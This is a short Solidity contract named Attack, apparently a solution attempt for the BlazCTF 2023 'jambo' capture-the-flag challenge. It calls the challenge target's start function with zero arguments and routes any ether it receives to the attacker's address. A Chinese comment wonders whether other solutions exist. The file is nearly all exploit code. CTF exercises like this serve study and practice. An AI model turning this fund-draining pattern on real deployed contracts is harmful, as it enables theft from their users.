pragma solidity ^0.8.22;

import "../../lib/blazctf-2023/challenges/jambo/challenge/project/src/Challenge.sol"; 


contract Attack {
    Challenge public chall;
    address public attacker;

    constructor(Challenge _chall) payable {
        chall = _chall;
        attacker = msg.sender;
    }

    function startAttack() public {
        address target = chall.target();

        Jambo(target).start(0, bytes32(0));//直接初始化掉，不知道会不会有别的解

        require(address(target).balance > 0, "Target has no funds");

        //selfdestruct(payable(attacker));
    }
    fallback() external payable {
        payable(attacker).transfer(address(this).balance);
    }

    receive() external payable {}
}
